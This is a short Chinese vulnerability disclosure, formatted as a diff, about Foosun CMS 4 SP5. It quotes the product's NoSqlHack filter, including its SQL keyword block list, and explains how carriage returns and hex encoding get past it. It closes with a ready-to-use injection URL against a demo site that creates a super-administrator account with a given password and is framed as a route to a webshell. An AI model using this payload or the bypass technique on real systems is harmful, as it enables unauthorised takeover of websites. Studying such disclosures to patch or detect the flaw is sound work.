@@ -1,0 +1,26 @@
+风讯4高危漏洞
+
+[风讯4高危漏洞 全文]oosun cms4sp5 商业版存在严重注射漏洞
+
+风讯4的防注射函数NoSqlHack存在致命缺陷，导致入侵者可以轻松得到webshell
+
+Function.asp 
+Function NoSqlHack(FS_inputStr)
+Dim f_NoSqlHack_AllStr,f_NoSqlHack_Str,f_NoSqlHack_i,Str_InputStr
+Str_InputStr=FS_inputStr
+f_NoSqlHack_AllStr="*|and |exec |or |insert |select |delete |update |count |master |truncate |declare |and |exec |insert |select |delete |update |count |master |truncate |declare |char(|mid(|chr(|and[|exec[|insert[|select[|delete[|update[|count[|master[|truncate[|declare[|set[|set |set |where[|where |where |xp_cmdshell|xp_cmdshell |xp_cmdshell "
+f_NoSqlHack_Str = Split(f_NoSqlHack_AllStr,"|")
+
+For f_NoSqlHack_i=LBound(f_NoSqlHack_Str) To Ubound(f_NoSqlHack_Str)
+If Instr(LCase(Str_InputStr),f_NoSqlHack_Str(f_NoSqlHack_i))<>0 Then
+If f_NoSqlHack_Str(f_NoSqlHack_i)="''" Then f_NoSqlHack_Str(f_NoSqlHack_i)=" \'' "
+Response.Write "<html><title>??</title><body bgcolor=""EEEEEE"" leftmargin=""60"" topmargin=""30""><font style=""font-size:16px;font-weight:bolder;color:blue;""><li>???????????</li></font><font style=""font-size:14px;font-weight:bolder;color:red;""><br><li>?????????!</li><br><li>??IP:"&Request.ServerVariables("Remote_Addr")&"</li><br><li>????:"&Now&"</li></font></body></html><!--Powered by Foosun Inc.,AddTime:"&now&"-->"
+Response.End
+End if
+Next
+NoSqlHack = Replace(Str_InputStr,"''","''''")
+End Function
+关键字后面跟空格和tab是过滤的,但是跟回车时一样可以执行注射语句.过滤单引号也没有用的，我插入时用16进制编码,所以每一个点都是有问题的注射点
+
+下面的代码可以创建一个用户名为oldjun，密码为12345678的超级管理员
+http://demo.foosun.net/User/i_Blog/PublicLogEdit.asp?id=2;insert%0D%0A%0D%0Ainto%20FS_MF_Admin%20(Admin_Name,Admin_Pass_Word,Admin_Is_Super)values(0x6F006C0064006A0075006E00,0x3800330061006100340030003000610066003400360034006300370036006400,1)--
